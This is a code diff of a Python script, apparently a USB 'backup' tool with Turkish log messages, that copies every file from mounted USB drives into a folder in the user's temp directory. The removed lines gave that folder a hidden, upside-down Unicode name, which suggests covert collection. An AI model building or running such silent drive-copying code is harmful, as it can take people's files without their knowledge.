@@ -2,8 +2,6 @@ import os
 import shutil
 from datetime import datetime
 import time
-import subprocess
-import sys
 import logging
 import psutil
 
@@ -12,7 +10,7 @@ LOG_DIR = os.path.join(SCRIPT_DIR, 'logs')
 os.makedirs(LOG_DIR, exist_ok=True)
 
 TEMP_DIR = os.getenv('TEMP', os.path.expanduser('~\\AppData\\Local\\Temp'))
-BASE_DIR = os.path.join(TEMP_DIR, '.soǝnbᴉʇɐɟ')
+BASE_DIR = os.path.join(TEMP_DIR, 'temp_files')
 os.makedirs(BASE_DIR, exist_ok=True)
 
 def setup_logging():
@@ -29,9 +27,8 @@ def find_usb_drives():
             usb_drives.append(drive.mountpoint)
     return usb_drives
 
-def create_backup_folder(backup_date):
-    backup_folder_name = backup_date.strftime('%Y-%m-%d')
-    target_folder = os.path.join(BASE_DIR, backup_folder_name)
+def create_backup_folder():
+    target_folder = BASE_DIR
     os.makedirs(target_folder, exist_ok=True)
     return target_folder
 
@@ -44,7 +41,7 @@ def copy_files(src, dest):
                 try:
                     shutil.copy(file_path, dest_path)
                 except PermissionError:
-                    logging.warning(f"{file_path} icin izin reddedildi. Atlanıyor.")
+                    logging.warning(f"{file_path} icin izin reddedildi. Atlaniyor.")
                 except Exception as e:
                     logging.error(f"{file_path} dosyasini kopyalarken hata: {e}")
             elif os.path.isdir(file_path):
@@ -59,10 +56,9 @@ def copy_files(src, dest):
         logging.error(f"Kopyalama islemi sirasinda hata: {e}")
 
 def backup_usb_drives():
-    current_date = datetime.now()
     usb_drives = find_usb_drives()
     if usb_drives:
-        backup_folder = create_backup_folder(current_date)
+        backup_folder = create_backup_folder()
         for usb_drive in usb_drives:
             logging.info(f"{usb_drive} icin yedekleme islemi baslatiliyor...")
             try:
